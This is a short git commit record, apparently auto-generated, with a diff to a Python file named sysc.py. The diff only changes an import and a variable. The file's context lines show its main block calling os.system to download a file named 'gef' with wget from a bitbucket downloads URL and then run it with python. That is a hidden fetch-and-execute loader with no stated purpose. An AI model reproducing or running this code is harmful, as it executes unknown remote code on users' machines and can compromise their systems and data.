cf5efb6ecee64f6742df5b8db5ae89460cc1c939
Your Name <you@example.com>
2024-09-23 06:54:45 +0200

    auto

--- sysc.py
+++ sysc.py
@@ -1,4 +1,4 @@
-import sys,os,itertools
-z=18
+import sys,os,decimal
+a=6
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
